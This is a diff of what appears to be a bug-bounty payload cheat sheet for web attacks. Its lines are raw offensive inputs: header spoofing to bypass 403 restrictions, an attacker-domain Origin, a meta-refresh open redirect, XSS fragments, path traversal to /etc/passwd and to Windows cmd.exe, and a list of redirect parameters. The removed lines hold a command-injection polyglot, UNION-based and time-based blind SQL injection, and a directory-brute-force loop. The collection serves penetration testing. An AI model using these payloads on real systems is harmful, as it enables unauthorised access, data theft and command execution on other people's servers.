@@ -1,18 +1,13 @@
 
-  X-Forwarded-Host
-  X-Forwarded-Port
-  X-Forwarded-Scheme
-  Origin: 
-  nullOrigin: [siteDomain].attacker.com
-  X-Frame-Options: Allow
-  X-Forwarded-For: 127.0.0.1
-  X-Client-IP: 127.0.0.1
-  Client-IP: 127.0.0.1
-
-
-Fire
- cat hosts | xargs -I@ sh -c 'python3 http://dirsearch.py -r -b -w path -u @ -e php,html,json,aspx' 
-Fire
+X-Forwarded-Host
+X-Forwarded-Port
+X-Forwarded-Scheme
+Origin: 
+nullOrigin: [siteDomain].attacker.com
+X-Frame-Options: Allow
+X-Forwarded-For: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
 
 
 0;url=http:&#x2F;&#x2F;www.evilzone.com"HTTP-EQUIV="refresh"any=".arexport
@@ -22,7 +17,6 @@ Fire
 alert
 aler%26%23116;%3E
 
-\\yourhost?;sleep${IFS}10;'/*!90000or*/+/*"><%00svg/onload=confirm`{{8*8}}`>*/'1
 
 If '/something' => 403
 Try -
@@ -47,19 +41,10 @@ Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
    *  select 0b01100001011000100110001101100100;
 3. select 'admin' = 'àdmin'; // is true if utf8 is allowed
 
-{"param":"11')))+UNION+SELECT+1,2,3,CONCAT(user(),version(),database()),5,6,7,8--+r0hack"}
 
-pass: changeme
 
-Cross-Site Scripting (XSS),
-Insecure Direct Object Reference (IDOR),
-Cross-Site Request Forgery (CSRF),
-Race Conditions,
-Information Disclosure.
 
 X-Custom-IP-Authorizition: 127.0.0.1
-
-
 X-Forwarded-For: 127.0.0.2
 X-Originting-IP: 127.0.0.1
 X-Remote-IP: 127.0.0.3
@@ -69,9 +54,8 @@ X-Host: 127.0.0.6
 X-Forwarded-Host: 127.0.0.1
 
 
-&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
 
-:/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
+
 
 .*\.google\.com 
 .*\.googleapis\.com
@@ -120,45 +104,45 @@ X-Forwarded-Host: 127.0.0.1
 
 /{payload}
 
- ?next={payload}
+?next={payload}
 
- ?url={payload}
+?url={payload}
 
- ?target={payload}
+?target={payload}
 
- ?rurl={payload}
+?rurl={payload}
 
- ?dest={payload}
+?dest={payload}
 
- ?destination={payload}
+?destination={payload}
 
- ?redir={payload}
+?redir={payload}
 
- ?redirect_url={payload}
+?redirect_url={payload}
 
- ?redirect={payload}
+?redirect={payload}
 
- /cgi-bin/redirect.cgi?{payload}
+/cgi-bin/redirect.cgi?{payload}
 
- ?out={payload}
+?out={payload}
 
- ?view={payload}
+?view={payload}
 
- /login?to={payload}
+/login?to={payload}
 
- ?image_url={payload}
+?image_url={payload}
 
- ?go={payload}
+?go={payload}
 
- ?return={payload}
+?return={payload}
 
- ?checkout_url={payload}
+?checkout_url={payload}
 
- ?continue={payload}
+?continue={payload}
 
- ?return_path={payload}
+?return_path={payload}
 
- \..\WINDOWS\win.ini
+\..\WINDOWS\win.ini
 ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
 .?\.?\.?\etc\passwd
 ../../boot.ini
